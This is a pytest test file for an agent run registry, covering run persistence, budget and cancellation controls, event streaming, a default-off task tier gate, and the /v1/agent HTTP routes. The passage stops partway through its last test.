"""Tests for the agent run registry + /v1/agent/* routes (ADR 0003 Stage 2, Inc 1).

Inc 1 scope: minimal run lifecycle — create/persist/list/get, synchronous
execution. Provider calls are not exercised here (that path is oneshot's,
already tested); these tests cover the registry, the filesystem store, and
the route surface with the provider call bypassed by seeding terminal runs
directly through the registry.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from ppxai.engine.agent_runs import (
    AgentRunRegistry,
    FilesystemAgentRunStore,
    RunMeta,
)


@pytest.fixture
def registry(tmp_path: Path) -> AgentRunRegistry:
    return AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))


# ---------------------------------------------------------------------------
# RunMeta dataclass
# ---------------------------------------------------------------------------


class TestRunMeta:
    def test_roundtrip_to_from_dict(self):
        m = RunMeta(run_id="run_x", task="t", tools=["read_file"], created_at=1.0)
        assert RunMeta.from_dict(m.to_dict()) == m

    def test_from_dict_ignores_unknown_keys(self):
        # Forward-compat read: a newer writer's extra field must not crash an
        # older reader.
        d = {"run_id": "run_x", "task": "t", "future_field": "ignored"}
        m = RunMeta.from_dict(d)
        assert m.run_id == "run_x"
        assert not hasattr(m, "future_field")

    def test_defaults(self):
        m = RunMeta(run_id="r", task="t")
        assert m.status == "pending"
        assert m.agent_n == 0
        assert m.tools == []
        assert m.budget == {}        # Inc 6
        assert m.resumable is False  # Inc 6

    def test_inc6_fields_roundtrip(self):
        m = RunMeta(run_id="r", task="t", budget={"iterations": 3}, resumable=True)
        assert RunMeta.from_dict(m.to_dict()) == m

    def test_workdir_roundtrips_and_defaults_none(self):
        # v1.19.x workdir-alignment: additive field — a pre-workdir meta.json
        # (no key) must load with workdir=None, and the field round-trips.
        old = {"run_id": "r", "task": "t"}
        assert RunMeta.from_dict(old).workdir is None
        m = RunMeta(run_id="r", task="t", workdir="/repo")
        assert RunMeta.from_dict(m.to_dict()) == m


class TestRunKind:
    """ADR 0011 (F1): the `kind` run discriminator — additive, legacy-safe."""

    def test_default_is_task(self):
        assert RunMeta(run_id="r", task="t").kind == "task"

    def test_legacy_meta_without_kind_reads_as_task(self):
        # A pre-F1 meta.json has no `kind` key — it must load as "task".
        assert RunMeta.from_dict({"run_id": "r", "task": "t"}).kind == "task"

    def test_kind_roundtrips(self):
        m = RunMeta(run_id="r", task="t", kind="oneshot")
        assert RunMeta.from_dict(m.to_dict()) == m

    def test_start_run_defaults_task_and_persists(self, registry, tmp_path):
        m = registry.start_run("plain")
        assert m.kind == "task"
        on_disk = json.loads(
            (tmp_path / "runs" / m.run_id / "agent-0" / "meta.json").read_text()
        )
        assert on_disk["kind"] == "task"

    def test_start_run_stamps_oneshot(self, registry):
        m = registry.start_run("one-off", kind="oneshot")
        assert m.kind == "oneshot"
        assert registry.get_run(m.run_id).kind == "oneshot"


# ---------------------------------------------------------------------------
# RunControl — cooperative budget/cancel (Inc 6)
# ---------------------------------------------------------------------------


class TestRunControl:
    def _ctl(self, **kw):
        from ppxai.engine.agent_runs import RunControl
        return RunControl(run_id="r", **kw)

    def test_no_budget_never_stops(self):
        c = self._ctl(budget={})
        c.iterations = 1000
        c.check(now=1e9)  # no raise

    def test_iteration_budget_raises_interrupted(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"iterations": 2})
        c.iterations = 1
        c.check(now=0.0)            # under cap: ok
        c.iterations = 2
        with pytest.raises(RunBudgetExceeded):
            c.check(now=0.0)        # at cap: stop
        # the exception carries the resumable/interrupted semantics
        assert RunBudgetExceeded("x").status == "interrupted"
        assert RunBudgetExceeded("x").resumable is True

    def test_time_budget_raises(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"time_s": 10.0}, started_at=100.0)
        c.check(now=105.0)          # 5s elapsed: ok
        with pytest.raises(RunBudgetExceeded):
            c.check(now=111.0)      # 11s elapsed: stop

    def test_token_budget_raises(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"tokens": 100})
        c.tokens_used = 50
        c.check(now=0.0)
        c.tokens_used = 100
        with pytest.raises(RunBudgetExceeded):
            c.check(now=0.0)

    def test_cancel_raises_cancelled(self):
        from ppxai.engine.agent_runs import RunCancelled
        c = self._ctl(budget={})
        c.cancel_requested = True
        with pytest.raises(RunCancelled):
            c.check(now=0.0)
        assert RunCancelled("x").status == "cancelled"
        assert RunCancelled("x").resumable is True

    def test_cancel_takes_precedence_over_budget(self):
        from ppxai.engine.agent_runs import RunCancelled
        c = self._ctl(budget={"iterations": 1})
        c.iterations = 99
        c.cancel_requested = True
        with pytest.raises(RunCancelled):  # cancel checked first
            c.check(now=0.0)


# ---------------------------------------------------------------------------
# Registry + filesystem store
# ---------------------------------------------------------------------------


class TestAgentRunRegistry:
    def test_create_persists_and_returns_meta(self, registry, tmp_path):
        m = registry.start_run("say hi", tools=["read_file"], provider="p", model="m")
        assert m.run_id.startswith("run_")
        assert m.status == "pending"
        assert m.tools == ["read_file"]
        # on disk at the ADR 0005 Triplet path
        assert (tmp_path / "runs" / m.run_id / "agent-0" / "meta.json").exists()

    def test_run_ids_are_unique(self, registry):
        ids = {registry.start_run("t").run_id for _ in range(20)}
        assert len(ids) == 20

    def test_persist_meta_leaves_no_tmp_and_is_valid(self, registry, tmp_path):
        # Gemini review #4: persist_meta writes via a unique mkstemp temp then
        # os.replace. After a successful write, only meta.json remains (no
        # leftover .tmp), and it round-trips.
        m = registry.start_run("persist me", provider="p", model="m")
        slot = tmp_path / "runs" / m.run_id / "agent-0"
        leftover = list(slot.glob("*.tmp")) + list(slot.glob("meta-*"))
        assert leftover == [], f"temp file(s) leaked: {leftover}"
        assert (slot / "meta.json").exists()
        assert registry.get_run(m.run_id).task == "persist me"

    def test_persist_meta_cleans_tmp_on_failure(self, registry, tmp_path, monkeypatch):
        # If os.replace fails mid-write, the temp file must not be left behind.
        import ppxai.engine.agent_runs as ar

        m = registry.start_run("t")
        slot = tmp_path / "runs" / m.run_id / "agent-0"
        # Wipe any pre-existing state, then force replace to fail.
        for p in slot.glob("*"):
            p.unlink()
        monkeypatch.setattr(ar.os, "replace", lambda *a, **k: (_ for _ in ()).throw(OSError("boom")))
        with pytest.raises(OSError):
            registry._store.persist_meta(m)
        assert list(slot.glob("*.tmp")) == [] and list(slot.glob("meta-*")) == []

    def test_get_run_returns_persisted(self, registry):
        m = registry.start_run("t")
        got = registry.get_run(m.run_id)
        assert got is not None and got.run_id == m.run_id

    def test_get_unknown_returns_none(self, registry):
        assert registry.get_run("run_does_not_exist") is None

    def test_finish_run_marks_terminal(self, registry):
        m = registry.start_run("t")
        registry.finish_run(m, status="completed", result="hello")
        got = registry.get_run(m.run_id)
        assert got.status == "completed"
        assert got.result == "hello"
        assert got.finished_at is not None

    def test_finish_run_records_error(self, registry):
        m = registry.start_run("t")
        registry.finish_run(m, status="failed", error="boom")
        got = registry.get_run(m.run_id)
        assert got.status == "failed" and got.error == "boom"

    def test_list_runs_newest_first(self, registry):
        m1 = registry.start_run("first")
        m2 = registry.start_run("second")
        runs = registry.list_runs()
        assert [r.run_id for r in runs] == [m2.run_id, m1.run_id]

    def test_list_empty_when_no_runs(self, registry):
        assert registry.list_runs() == []

    def test_corrupt_meta_skipped_not_fatal(self, registry, tmp_path):
        m = registry.start_run("good")
        # Plant a corrupt run dir alongside the good one.
        bad = tmp_path / "runs" / "run_corrupt" / "agent-0"
        bad.mkdir(parents=True)
        (bad / "meta.json").write_text("{not json", encoding="utf-8")
        runs = registry.list_runs()
        # good run still listed; corrupt one skipped, no exception
        assert m.run_id in [r.run_id for r in runs]


# ---------------------------------------------------------------------------
# Background execution (Inc 2)
# ---------------------------------------------------------------------------


class TestRunInBackground:
    @pytest.mark.asyncio
    async def test_runs_to_completion(self, registry):
        import asyncio

        m = registry.start_run("t")

        async def runner(meta):
            return "the result"

        registry.run_in_background(m, runner)
        # status flips to running immediately, started_at set
        assert m.status == "running" and m.started_at is not None
        # let the background task finish
        for _ in range(50):
            if registry.get_run(m.run_id).status == "completed":
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "completed" and got.result == "the result"

    @pytest.mark.asyncio
    async def test_runner_exception_marks_failed(self, registry):
        import asyncio

        m = registry.start_run("t")

        async def runner(meta):
            raise RuntimeError("kaboom")

        registry.run_in_background(m, runner)
        for _ in range(50):
            if registry.get_run(m.run_id).status == "failed":
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "failed" and "kaboom" in got.error

    @pytest.mark.asyncio
    async def test_cooperative_cancel_marks_cancelled(self, registry):
        # Inc 6: a runner that polls control.check() between steps stops
        # cooperatively when cancel_run flips the flag — status=cancelled,
        # resumable=True, and the stop lands at the checkpoint (not mid-step).
        import asyncio

        m = registry.start_run("t")
        steps_done = []

        async def runner(meta):
            ctl = registry.get_control(meta.run_id)
            for i in range(100):
                ctl.check(now=0.0)        # checkpoint — raises RunCancelled
                steps_done.append(i)
                await asyncio.sleep(0.01)
            return "never reached"

        registry.run_in_background(m, runner)
        await asyncio.sleep(0.03)          # let a couple steps run
        assert registry.cancel_run(m.run_id) is True
        for _ in range(100):
            if registry.get_run(m.run_id).status in ("cancelled", "failed"):
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "cancelled"   # not failed
        assert got.resumable is True
        assert len(steps_done) < 100       # stopped early, at a checkpoint
        # control is cleaned up after the run finishes
        assert registry.get_control(m.run_id) is None

    def test_cancel_unknown_run_returns_false(self, registry):
        assert registry.cancel_run("run_does_not_exist") is False

    @pytest.mark.asyncio
    async def test_cancel_cascades_to_child(self, registry):
        # Item 37e / secondary review: cancelling a parent must cascade to its
        # in-flight children so a sub-agent isn't orphaned (kept consuming
        # budget/LLM calls) when its parent is cancelled. The cascade is a
        # registry invariant, independent of whether anyone is polling in
        # _await_child.
        import asyncio

        parent = registry.start_run("parent")

        async def runner(meta):
            ctl = registry.get_control(meta.run_id)
            for _ in range(200):
                ctl.check(now=0.0)
                await asyncio.sleep(0.01)
            return "never"

        registry.run_in_background(parent, runner)
        # Child linked to the parent, also in-flight.
        child = registry.start_run("child", parent_run_id=parent.run_id)
        registry.run_in_background(child, runner)
        await asyncio.sleep(0.03)

        # Cancel ONLY the parent — the child must be cancelled too.
        assert registry.cancel_run(parent.run_id) is True
        for _ in range(200):
            cs = registry.get_run(child.run_id).status
            ps = registry.get_run(parent.run_id).status
            if cs in ("cancelled", "failed") and ps in ("cancelled", "failed"):
                break
            await asyncio.sleep(0.01)
        assert registry.get_run(parent.run_id).status == "cancelled"
        assert registry.get_run(child.run_id).status == "cancelled"  # cascaded

    @pytest.mark.asyncio
    async def test_cancel_cascade_does_no_disk_read_for_children(self, registry):
        # Gemini review #3: the cascade reads each in-flight child's
        # parent_run_id from the in-memory _active index, NOT from disk. Guard:
        # if it calls store.load_meta during the child scan, fail.
        import asyncio

        parent = registry.start_run("parent")

        async def runner(meta):
            ctl = registry.get_control(meta.run_id)
            for _ in range(200):
                ctl.check(now=0.0)
                await asyncio.sleep(0.01)
            return "never"

        registry.run_in_background(parent, runner)
        child = registry.start_run("child", parent_run_id=parent.run_id)
        registry.run_in_background(child, runner)
        await asyncio.sleep(0.03)

        calls = {"n": 0}
        real_load = registry._store.load_meta

        def counting_load(run_id, *a, **k):
            calls["n"] += 1
            return real_load(run_id, *a, **k)

        registry._store.load_meta = counting_load
        try:
            registry.cancel_run(parent.run_id)
        finally:
            registry._store.load_meta = real_load
        # cancel_run loads the run's OWN meta to flip status (1 per cancelled
        # node: parent + child = 2), but must NOT scan children via disk. The
        # key assertion: no EXTRA load per non-child control. With only parent
        # + child in flight, loads == 2 (one each), not 2 + child-scan reads.
        assert calls["n"] <= 2, (
            f"cascade did {calls['n']} disk reads; child lookup should come "
            f"from the in-memory _active index, not load_meta"
        )
        await asyncio.sleep(0.05)

    def test_cancel_not_in_flight_returns_false(self, registry):
        # Cascade over a run with no registered control (never backgrounded)
        # returns False and the child-scan doesn't raise.
        m = registry.start_run("solo")
        assert registry.cancel_run(m.run_id) is False


# ---------------------------------------------------------------------------
# Run events (Inc 3) — emit, persist, filter
# ---------------------------------------------------------------------------


class TestRunEvents:
    def test_emit_persists_and_assigns_seq(self, registry):
        m = registry.start_run("t")
        e1 = registry.emit_event(m.run_id, "a", level="info", category="lifecycle")
        e2 = registry.emit_event(m.run_id, "b", level="debug", category="tool")
        assert (e1.seq, e2.seq) == (1, 2)
        evs = registry.read_events(m.run_id)
        assert [e.type for e in evs] == ["a", "b"]

    def test_since_cursor(self, registry):
        m = registry.start_run("t")
        for i in range(3):
            registry.emit_event(m.run_id, f"e{i}")
        assert [e.seq for e in registry.read_events(m.run_id, since=1)] == [2, 3]

    def test_min_level_filter(self, registry):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "dbg", level="debug")
        registry.emit_event(m.run_id, "err", level="error")
        got = registry.read_events(m.run_id, min_level="warning")
        assert [e.type for e in got] == ["err"]

    def test_category_filter(self, registry):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "t1", category="tool")
        registry.emit_event(m.run_id, "l1", category="lifecycle")
        got = registry.read_events(m.run_id, categories={"tool"})
        assert [e.type for e in got] == ["t1"]

    def test_seq_seeds_from_disk_on_fresh_registry(self, registry, tmp_path):
        # A fresh registry over the same store must not restart seq at 1.
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "a")
        registry.emit_event(m.run_id, "b")
        fresh = AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))
        e = fresh.emit_event(m.run_id, "c")
        assert e.seq == 3  # continues, doesn't collide

    @pytest.mark.asyncio
    async def test_subscribe_then_snapshot_no_lost_event(self, registry):
        # Lost-event race guard (codex HIGH): if a client subscribes, then
        # an event is emitted, then the backlog is snapshotted, the event
        # must be delivered exactly once — via the queue, deduped against
        # the backlog by seq. Models the SSE handler's ordering.
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "e1")  # pre-existing backlog

        q = registry.subscribe(m.run_id)          # 1. subscribe FIRST
        registry.emit_event(m.run_id, "e2")       # 2. emit in the race window
        backlog = registry.read_events(m.run_id)  # 3. snapshot AFTER subscribe

        # backlog may or may not include e2 depending on timing; the queue
        # definitely has it. Simulate the handler: send backlog, then drain
        # queue with seq-dedup.
        sent = []
        last_seq = 0
        for ev in backlog:
            last_seq = max(last_seq, ev.seq)
            sent.append(ev.type)
        # drain whatever the queue holds without blocking
        while not q.empty():
            ev = q.get_nowait()
            if ev.seq <= last_seq:
                continue
            last_seq = ev.seq
            sent.append(ev.type)
        registry.unsubscribe(m.run_id, q)
        # e2 delivered exactly once, e1 once — neither lost nor duplicated
        assert sent.count("e2") == 1
        assert sent.count("e1") == 1

    @pytest.mark.asyncio
    async def test_overflow_sets_flag_not_silent_drop(self, registry):
        # Slow-consumer overflow (codex MEDIUM): when a subscriber's queue
        # fills, emit_event must NOT silently drop — it flags the queue
        # _ppxai_overflowed so the SSE generator can self-heal from disk.
        m = registry.start_run("t")
        q = registry.subscribe(m.run_id)
        # fill the queue past maxsize so the next emit overflows it
        for i in range(q.maxsize + 5):
            registry.emit_event(m.run_id, f"e{i}")
        assert getattr(q, "_ppxai_overflowed", False) is True
        # ALL events are still on disk — nothing lost; the generator would
        # replay from disk via read_events(since=last_seq).
        on_disk = registry.read_events(m.run_id)
        assert len(on_disk) == q.maxsize + 5
        registry.unsubscribe(m.run_id, q)

    def test_torn_last_line_skipped(self, registry, tmp_path):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "good")
        path = tmp_path / "runs" / m.run_id / "agent-0" / "events.jsonl"
        with path.open("a", encoding="utf-8") as f:
            f.write('{"seq": 2, "ts": 1, "typ')  # torn write (crash mid-append)
        evs = registry.read_events(m.run_id)
        assert [e.type for e in evs] == ["good"]  # torn line skipped, not fatal


# ---------------------------------------------------------------------------
# /v1/agent/* routes (provider call bypassed)
# ---------------------------------------------------------------------------


@pytest.fixture
def client(tmp_path, monkeypatch):
    import ppxai.server.state as state
    from ppxai.server.routes import agent_v1
    from ppxai.engine import task_runner

    reg = AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))
    monkeypatch.setattr(state, "_agent_run_registry", reg)

    app = FastAPI()
    app.include_router(agent_v1.router)
    return TestClient(app), reg


@pytest.fixture(autouse=True)
def _enable_task_tier(monkeypatch):
    """The tool-capable /v1/agent/task tier ships DEFAULT-OFF (v1.19.0). These
    tests exercise the tier itself, so enable it — preserving all other real
    config keys. A test that fully replaces get_execution_task_config in its
    own body (e.g. the gate tests below) overrides this.

    ADR 0010 (v1.19.1): the gate moved from tools.agent.task_tier_enabled to
    execution.task.enabled, so the patch target is the execution accessor."""
    from ppxai.server.routes import agent_v1
    from ppxai.engine import task_runner
    real = agent_v1.get_execution_task_config
    monkeypatch.setattr(
        agent_v1, "get_execution_task_config",
        lambda: {**real(), "enabled": True},
    )


@pytest.fixture(autouse=True)
def _pin_execution_run_config(monkeypatch):
    """U3: POST /v1/agent/run reads execution.run.web_search from the REAL
    config (the host's ppxai-config.json), which would make these tests'
    launch path depend on the machine they run on. Pin the default (off);
    tests of the grant path re-patch to {'web_search': True} themselves."""
    from ppxai.config import execution as exec_mod
    monkeypatch.setattr(
        exec_mod, "get_execution_run_config",
        lambda: {"web_search": False, "grounding": False},
    )
    # U4: same determinism for execution.collect — the T6 hold expectations
    # here assume the shipped default ("yes" → hold).
    monkeypatch.setattr(exec_mod, "get_execution_collect", lambda: "yes")


class TestTaskTierGate:
    """/v1/agent/task is default-OFF; only an explicit opt-in
    (execution.task.enabled) makes the tool-capable tier reachable
    (threat model A — trusted operators). The tool-free /run tier is unaffected."""

    def test_task_disabled_returns_403(self, client, monkeypatch):
        c, _ = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(
            agent_v1, "get_execution_task_config", lambda: {"enabled": False}
        )
        r = c.post("/v1/agent/task", json={"task": "do a thing", "tools": ["read_file"]})
        assert r.status_code == 403
        # The 403 must name the NEW key path — an operator who follows a
        # stale hint edits a key nothing reads (ADR 0010: no dual-read).
        assert "execution.task.enabled" in r.json()["detail"]

    def test_run_tier_not_gated_by_task_flag(self, client, monkeypatch):
        c, _ = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(
            agent_v1, "get_execution_task_config", lambda: {"enabled": False}
        )
        monkeypatch.setattr(agent_v1, "get_execution_default_subagent", lambda: {})
        # /run with no provider → 400 (reached provider resolution), NOT 403:
        # the tool-free tier is never gated by the task flag.
        r = c.post("/v1/agent/run", json={"task": "ping"})
        assert r.status_code != 403


class TestExecutionTaskConfig:
    """get_execution_task_config must SURFACE every tier key.

    Regression guard: the accessor whitelists keys, so a new tier config key
    that isn't added silently reads as None even when present in
    ppxai-config.json — which is exactly how spawn_consent was dead-on-arrival
    until the whitelist was updated.

    ADR 0010 (v1.19.1): these keys moved off tools.agent.* to execution.task.*
    with NO dual-read, so the patch target is the execution block, and a key
    left behind under tools.agent is expected to have NO effect (asserted in
    test_legacy_tools_agent_location_is_ignored)."""

    def test_spawn_consent_defaults_deny(self, monkeypatch):
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(exec_mod, "_read_execution_block", lambda: {})
        assert exec_mod.get_execution_task_config()["consent"]["spawn_consent"] == "deny"

    def test_spawn_consent_reads_auto_from_config(self, monkeypatch):
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(
            exec_mod, "_read_execution_block",
            lambda: {"task": {"consent": {"spawn_consent": "auto"}}},
        )
        assert exec_mod.get_execution_task_config()["consent"]["spawn_consent"] == "auto"

    def test_consent_ttl_defaults_300(self, monkeypatch):
        # T5: same whitelist trap — consent_ttl_s must be surfaced or the
        # park TTL silently ignores the operator's config.
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(exec_mod, "_read_execution_block", lambda: {})
        assert exec_mod.get_execution_task_config()["consent"]["consent_ttl_s"] == 300.0

    def test_consent_ttl_reads_from_config(self, monkeypatch):
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(
            exec_mod, "_read_execution_block",
            lambda: {"task": {"consent": {"consent_ttl_s": 42}}},
        )
        assert exec_mod.get_execution_task_config()["consent"]["consent_ttl_s"] == 42.0

    def test_result_retention_defaults_3600(self, monkeypatch):
        # T6: same whitelist trap — result_retention_s must be surfaced or the
        # retention reaper silently ignores the operator's config.
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(exec_mod, "_read_execution_block", lambda: {})
        assert (
            exec_mod.get_execution_task_config()["budgets"]["result_retention_s"]
            == 3600.0
        )

    def test_result_retention_reads_from_config(self, monkeypatch):
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(
            exec_mod, "_read_execution_block",
            lambda: {"task": {"budgets": {"result_retention_s": 0}}},
        )
        assert (
            exec_mod.get_execution_task_config()["budgets"]["result_retention_s"] == 0.0
        )

    def test_task_tier_defaults_disabled(self, monkeypatch):
        from ppxai.config import execution as exec_mod
        monkeypatch.setattr(exec_mod, "_read_execution_block", lambda: {})
        assert exec_mod.get_execution_task_config()["enabled"] is False

    def test_legacy_tools_agent_location_is_ignored(self, monkeypatch):
        """ADR 0010 is a CLEAN BREAK — no dual-read.

        A config still carrying the pre-v1.19.1 keys under tools.agent must
        NOT enable the tier or loosen consent. This is the whole reason
        /doctor reports the old->new mapping: the failure is silent, so it
        needs an explicit guard."""
        from ppxai.config import execution as exec_mod
        from ppxai.config import tools as tools_cfg

        monkeypatch.setattr(exec_mod, "_read_execution_block", lambda: {})
        monkeypatch.setattr(
            tools_cfg, "get_tool_config",
            lambda name: {
                "task_tier_enabled": True,
                "spawn_consent": "auto",
                "consent_ttl_s": 999,
                "result_retention_s": 1,
            },
        )
        task_cfg = exec_mod.get_execution_task_config()
        assert task_cfg["enabled"] is False
        assert task_cfg["consent"]["spawn_consent"] == "deny"
        assert task_cfg["consent"]["consent_ttl_s"] == 300.0
        assert task_cfg["budgets"]["result_retention_s"] == 3600.0
        # ...and the legacy keys are gone from the tools.agent surface too.
        assert "task_tier_enabled" not in tools_cfg.get_agent_config()
        assert "spawn_consent" not in tools_cfg.get_agent_config()

    def test_unreadable_config_fails_safe(self, monkeypatch):
        """An UNREADABLE config source must disable the tier, not default it open.

        Distinct from an absent `execution` block (normal — resolve defaults):
        here the config source itself failed. A capability must never survive
        the failure of the config that governs it, so the tool-capable tier
        resolves DISABLED with consent "deny" and the sandbox defaults."""
        from ppxai.config import execution as exec_mod

        def _boom():
            raise exec_mod._ConfigUnavailable("config source unreadable")

        monkeypatch.setattr(exec_mod, "_read_execution_block", _boom)
        task_cfg = exec_mod.get_execution_task_config()
        assert task_cfg["enabled"] is False
        assert task_cfg["consent"]["spawn_consent"] == "deny"
        assert task_cfg["sandbox"]["enforcement"] == "off"


class TestAgentRunRoutes:
    def test_list_empty(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs").json() == {"runs": []}

    def test_get_unknown_404(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs/run_nope").status_code == 404

    def test_seeded_run_lists_and_fetches(self, client):
        c, reg = client
        m = reg.start_run("manual", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="completed", result="hi")

        listed = c.get("/v1/agent/runs").json()["runs"]
        assert [r["run_id"] for r in listed] == [m.run_id]
        assert listed[0]["tools"] == ["read_file"]

        one = c.get(f"/v1/agent/runs/{m.run_id}").json()
        assert one["status"] == "completed"
        assert one["result"] == "hi"

    def test_kind_surfaces_on_wire_and_filters(self, client):
        # ADR 0011 (F1): `kind` is on the projection, and ?kind= partitions
        # the listing so each command family sees only its own runs.
        c, reg = client
        t = reg.start_run("managed", tools=["read_file"], provider="p", model="m")
        o = reg.start_run("one-off", kind="oneshot", provider="p", model="m")
        for m in (t, o):
            reg.finish_run(m, status="completed", result="ok")

        allruns = c.get("/v1/agent/runs").json()["runs"]
        assert {r["run_id"]: r["kind"] for r in allruns} == {
            t.run_id: "task", o.run_id: "oneshot",
        }
        tasks = c.get("/v1/agent/runs?kind=task").json()["runs"]
        assert [r["run_id"] for r in tasks] == [t.run_id]
        ones = c.get("/v1/agent/runs?kind=oneshot").json()["runs"]
        assert [r["run_id"] for r in ones] == [o.run_id]

    def test_kind_filter_rejects_unknown_value(self, client):
        c, _ = client
        r = c.get("/v1/agent/runs?kind=bogus")
        assert r.status_code == 400
        assert "oneshot" in r.json()["detail"]

    @staticmethod
    def _fake_provider():
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _FakeProvider(OpenAICompatibleProvider):
            def __init__(self):  # bypass real provider construction
                pass

            def oneshot(self, *, prompt, model, system=None, **kw):
                return {"content": f"echo: {prompt}", "finish_reason": "stop"}

        return _FakeProvider()

    # T6 grew the set again: a held /task run lands completed_pending_ack
    # (finalized after ack); the /run tier still lands completed.
    _TERMINAL = ("completed", "completed_pending_ack", "finalized",
                 "failed", "cancelled", "interrupted")

    @classmethod
    def _poll_terminal(cls, c, run_id, timeout_s=5.0):
        """Poll GET until the run reaches a terminal status (Inc 2 is async).
        Terminal set grew in Inc 6 to include cancelled/interrupted."""
        import time as _t

        deadline = _t.monotonic() + timeout_s
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{run_id}").json()
            if one["status"] in cls._TERMINAL:
                return one
            _t.sleep(0.02)
        raise AssertionError(f"run {run_id} did not finish: last={one}")

    def test_no_provider_no_default_400(self, client, monkeypatch):
        # No provider in request AND no tools.agent.default_subagent -> 400,
        # no run created. (Resolution: request -> config -> 400. Session chat
        # provider is intentionally NOT consulted.)
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(agent_v1, "get_execution_default_subagent", lambda: {})
        resp = c.post("/v1/agent/run", json={"task": "t"})
        assert resp.status_code == 400
        assert "provider" in resp.json()["detail"].lower()
        assert reg.list_runs() == []

    def test_explicit_provider_model_in_request(self, client, monkeypatch):
        # The contract path: provider/model passed explicitly per run (what
        # spawn_subagent always does). Completes with result + records them.
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: self._fake_provider())

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "tools": ["read_file"],
            "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 200
        assert resp.json()["status"] == "running"
        one = self._poll_terminal(c, resp.json()["run_id"])
        # U3: /run rides the T6 hold like /task — success parks the result
        # until collected; the meta carries kind=oneshot.
        assert one["status"] == "completed_pending_ack"
        assert one["kind"] == "oneshot"
        assert one["result"] == "echo: ping"
        assert one["tools"] == ["read_file"]  # provenance only, never executed
        assert one["provider"] == "fakeprov" and one["model"] == "fakemodel"
        assert one["started_at"] is not None

    def test_falls_back_to_default_subagent_config(self, client, monkeypatch):
        # No provider/model in request -> resolves from
        # tools.agent.default_subagent (NOT the session chat provider).
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        monkeypatch.setattr(
            agent_v1, "get_execution_default_subagent",
            lambda: {"provider": "cfgprov", "model": "cfgmodel"},
        )
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: self._fake_provider())

        resp = c.post("/v1/agent/run", json={"task": "ping"})
        assert resp.status_code == 200
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["status"] == "completed_pending_ack"  # U3: held (T6)
        assert one["provider"] == "cfgprov" and one["model"] == "cfgmodel"

    def test_explicit_provider_gets_its_own_default_model(self, client, monkeypatch):
        # Explicit provider WITHOUT model: default_subagent.model belongs to
        # default_subagent.provider — cross-pairing them 400s at the real API
        # (e.g. perplexity handed a Qwen model id). The chosen provider's own
        # default_model must win instead (mirrors /v1/oneshot).
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        monkeypatch.setattr(
            agent_v1, "get_execution_default_subagent",
            lambda: {"provider": "cfgprov", "model": "cfgmodel"},
        )
        monkeypatch.setattr(
            agent_v1, "get_default_model",
            lambda name=None: "otherprov-default" if name == "otherprov" else "",
        )
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: self._fake_provider())

        resp = c.post("/v1/agent/run", json={"task": "ping", "provider": "otherprov"})
        assert resp.status_code == 200
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["provider"] == "otherprov"
        assert one["model"] == "otherprov-default"  # NOT cfgmodel

    def test_provider_failure_marks_run_failed(self, client, monkeypatch):
        # If the background LLM call raises, the run ends 'failed' (not lost).
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _BoomProvider(OpenAICompatibleProvider):
            def __init__(self):
                pass

            def oneshot(self, *, prompt, model, system=None, **kw):
                raise RuntimeError("upstream 503")

        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _BoomProvider())

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 200
        assert resp.json()["status"] == "running"
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["status"] == "failed"
        assert "upstream 503" in one["error"]

    def test_unbuildable_provider_400_no_run_created(self, client, monkeypatch):
        # v1.19.x: the v1 tier is provider-AGNOSTIC (gates by capability, not
        # class). The only up-front 400 is an UNBUILDABLE provider — unknown
        # name / missing key — which _build_provider raises BEFORE minting, so
        # no orphan run is created.
        c, reg = client
        from fastapi import HTTPException
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner

        def _raise(name):
            raise HTTPException(status_code=400, detail=f"unknown provider {name!r}")
